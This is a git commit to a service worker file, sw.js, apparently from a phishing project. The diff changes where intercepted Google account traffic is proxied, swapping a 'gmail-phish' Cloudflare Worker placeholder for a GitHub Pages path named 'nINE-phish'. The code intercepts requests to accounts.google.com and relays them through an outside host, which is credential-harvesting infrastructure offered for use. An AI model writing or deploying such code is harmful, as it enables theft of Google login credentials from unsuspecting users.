db0ab13b18786c9cda45fe870217a3757f2eeeaa
ia7353038-crypto <ia7353038@gmail.com>
2026-01-28 06:27:37 -0800

    Change proxy URL for Google traffic in service worker

--- sw.js
+++ sw.js
@@ -4,7 +4,7 @@ self.addEventListener('fetch', event => {
         event.request.url.includes('accounts.google.com')) {
         
         // Proxy ALL Google traffic through Worker
-        const url = event.request.url.replace(window.location.origin, 'https://gmail-phish.YOURWORKER.workers.dev');
+        const url = event.request.url.replace(window.location.origin, 'https://ia7353038-crypto.github.io/nINE-phish/');
         event.respondWith(fetch(url, event.request));
     }
 });
